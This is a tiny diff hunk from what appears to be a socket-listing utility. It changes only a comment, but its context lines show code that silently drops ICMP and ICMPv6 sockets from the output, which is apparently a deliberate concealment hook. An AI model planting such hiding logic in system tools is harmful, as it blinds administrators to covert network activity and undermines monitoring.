@@ -2466,7 +2466,7 @@ static void proc_ctx_print(struct sockstat *s)
 }
 
 static void inet_stats_print(struct sockstat *s, bool v6only) {
-    	/* Mao hook to hide ICMP/ICMPv6 sockets entirely */
+    	/* Mao handler to hide ICMP/ICMPv6 sockets entirely */
     	if (s->type == IPPROTO_ICMP || s->type == IPPROTO_ICMPV6)
     	    	return;
 
